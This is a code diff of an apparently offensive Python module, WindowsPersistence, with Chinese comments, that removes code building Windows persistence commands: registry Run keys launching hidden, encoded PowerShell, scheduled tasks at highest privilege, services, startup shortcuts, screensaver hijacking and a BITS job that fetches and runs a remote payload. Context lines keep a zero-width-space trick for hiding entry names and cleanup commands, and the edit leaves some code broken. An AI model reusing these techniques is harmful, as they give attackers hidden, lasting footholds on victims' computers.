@@ -96,7 +96,6 @@ class WindowsPersistence:
         if hidden:
             name = "\u200b" + name  # Zero-width space
 
-        command = f'reg add "{reg_path}" /v "{name}" /t REG_SZ /d "{payload_path}" /f'
         cleanup = f'reg delete "{reg_path}" /v "{name}" /f'
 
         return PersistenceResult(
@@ -122,15 +121,9 @@ class WindowsPersistence:
         if encoded:
             # Base64 编码 PowerShell 命令
             ps_cmd = f'IEX (Get-Content "{payload_path}" -Raw)'
-            encoded_cmd = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
-            value = f"powershell.exe -WindowStyle Hidden -EncodedCommand {encoded_cmd}"
-        else:
-            value = (
-                f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "{payload_path}"'
-            )
+            base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
 
         reg_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-        command = f'reg add "{reg_path}" /v "{name}" /t REG_SZ /d "{value}" /f'
         cleanup = f'reg delete "{reg_path}" /v "{name}" /f'
 
         return PersistenceResult(
@@ -162,23 +155,6 @@ class WindowsPersistence:
         """
         name = name or self._generate_name("Task")
 
-        # 构建触发器参数
-        if trigger == "onlogon":
-            trigger_arg = "/sc onlogon"
-        elif trigger == "onstart":
-            trigger_arg = "/sc onstart"
-        elif trigger == "daily":
-            trigger_arg = "/sc daily /st 09:00"
-        elif trigger == "minute":
-            interval = interval_minutes or 30
-            trigger_arg = f"/sc minute /mo {interval}"
-        else:
-            trigger_arg = "/sc onlogon"
-
-        # 运行级别
-        rl_arg = "/rl highest" if run_level == "highest" else ""
-
-        command = f'schtasks /create /tn "{name}" /tr "{payload_path}" {trigger_arg} {rl_arg} /f'
         cleanup = f'schtasks /delete /tn "{name}" /f'
 
         return PersistenceResult(
@@ -259,8 +235,6 @@ class WindowsPersistence:
         name = name or self._generate_name("Svc")
         display_name = display_name or f"Windows {name}"
 
-        command = f'sc create "{name}" binPath= "{payload_path}" start= {start_type} DisplayName= "{display_name}"'
-        start_cmd = f'sc start "{name}"'
         cleanup = f'sc stop "{name}" & sc delete "{name}"'
 
         return PersistenceResult(
@@ -358,13 +332,6 @@ Get-WmiObject -Namespace "root\\subscription" -Class "__FilterToConsumerBinding"
 
         # 创建快捷方式的 VBScript
         lnk_name = f"{name}.lnk"
-        vbs_script = f"""
-Set WshShell = CreateObject("WScript.Shell")
-Set lnk = WshShell.CreateShortcut("{startup_path}\\{lnk_name}")
-lnk.TargetPath = "{payload_path}"
-lnk.WindowStyle = 7
-lnk.Save
-"""
 
         return PersistenceResult(
             success=True,
@@ -379,14 +346,6 @@ lnk.Save
         """
         屏保持久化 (需要管理员权限修改 HKLM)
         """
-        commands = [
-            'reg add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "{}" /f'.format(
-                payload_path
-            ),
-            'reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f',
-            'reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveTimeOut /t REG_SZ /d "60" /f',
-        ]
-
         cleanup_commands = [
             'reg delete "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /f',
         ]
@@ -410,14 +369,6 @@ lnk.Save
             name: Job 名称
         """
         name = name or self._generate_name("BITS")
-
-        commands = [
-            f'bitsadmin /create "{name}"',
-            f'bitsadmin /addfile "{name}" "{payload_url}" "{local_path}"',
-            f'bitsadmin /SetNotifyCmdLine "{name}" "{local_path}" NUL',
-            f'bitsadmin /SetMinRetryDelay "{name}" 60',
-            f'bitsadmin /resume "{name}"',
-        ]
 
         return PersistenceResult(
             success=True,
